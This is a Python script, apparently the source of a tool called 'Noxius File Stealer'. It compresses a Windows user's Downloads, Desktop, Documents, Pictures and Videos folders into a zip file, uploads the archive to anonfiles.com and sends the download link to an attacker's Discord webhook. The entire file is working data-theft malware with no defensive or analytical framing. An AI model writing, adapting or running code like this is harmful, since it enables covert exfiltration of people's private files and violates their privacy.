import zipfile
import shutil
import os
import requests
import multiprocessing
from discord import SyncWebhook, Embed

webhook = "YOUR-WEBHOOK-HERE"

dirs_to_zip = [
    os.path.join(os.environ.get("USERPROFILE"), "Downloads"),
    os.path.join(os.environ.get("USERPROFILE"), "Desktop"),
    os.path.join(os.environ.get("USERPROFILE"), "Documents"),
    os.path.join(os.environ.get("USERPROFILE"), "Pictures"),
    os.path.join(os.environ.get("USERPROFILE"), "Videos"),
]

zip_filename = f"NoxiusFileStealer-{os.getlogin()}.zip"
if os.path.exists(zip_filename):
    os.remove(zip_filename)

def zip_files(dirs_to_zip, zip_filename):
    with zipfile.ZipFile(zip_filename, "w") as zip_file:
        for dir_path in dirs_to_zip:
            folder_name = os.path.basename(dir_path)
            for root, _, files in os.walk(dir_path):
                for file in files:
                    file_path = os.path.join(root, file)
                    zip_file.write(file_path, arcname=os.path.join(folder_name, file))

if __name__ == '__main__':
    multiprocessing.freeze_support()
    p = multiprocessing.Process(target=zip_files, args=(dirs_to_zip, zip_filename))
    p.start()
    p.join()

    with open(f"{os.getenv('LOCALAPPDATA')}\\Temp\\{zip_filename}", "rb") as file:
        response = requests.post("https://api.anonfiles.com/upload", files={"file": file})
    link = response.json()["data"]["file"]["url"]["short"]
    embed = Embed(title="Files Dumped", description=f"Download the files [here]({link})", color=0x000001)
    embed.set_footer(text="Noxius File Stealer")
    embed.set_thumbnail(url="https://cdn.franafp.com/images/big-noxius.png")
    embed.set_author(name="Noxius File Stealer", url="https://github.com/Noxius-TM/Noxius-File-Stealer", icon_url="https://cdn.franafp.com/images/big-noxius.png")
    embed.add_field(name="Downloads", value=f"C:\\Users\\{os.getlogin()}\\Downloads")
    embed.add_field(name="Desktop", value=f"C:\\Users\\{os.getlogin()}\\Desktop")
    embed.add_field(name="Documents", value=f"C:\\Users\\{os.getlogin()}\\Documents")
    embed.add_field(name="Pictures", value=f"C:\\Users\\{os.getlogin()}\\Pictures")
    embed.add_field(name="Videos", value=f"C:\\Users\\{os.getlogin()}\\Videos")
    embed.add_field(name="Zip File", value=f"{zip_filename}")
    webhook = SyncWebhook.from_url(webhook , session=requests.session())
    webhook.send(embed=embed)
